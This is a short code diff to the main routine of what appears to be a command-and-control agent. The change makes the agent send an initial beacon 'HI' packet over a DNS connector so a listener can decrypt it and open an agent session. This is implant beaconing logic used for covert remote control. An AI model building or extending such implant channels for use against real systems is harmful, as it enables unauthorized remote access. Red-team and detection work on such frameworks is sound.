@@ -264,12 +264,18 @@ void AgentMain()
 
 	g_Connector = (ConnectorDNS*)MemAllocLocal(sizeof(ConnectorDNS));
 	*g_Connector = ConnectorDNS();
-
+		
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
-
+		
 	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize))
 		return;
+
+	// For DNS transport, the initial beat must be sent once over the
+	// connector so that the listener can see the "HI" packet, decrypt
+	// it with the listener encrypt_key, and create the agent session.
+	// Subsequent traffic uses the normal loop below (PUT/GET).
+	g_Connector->SendData(beat, beatSize);
 
 	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
 	*packerOut = Packer();
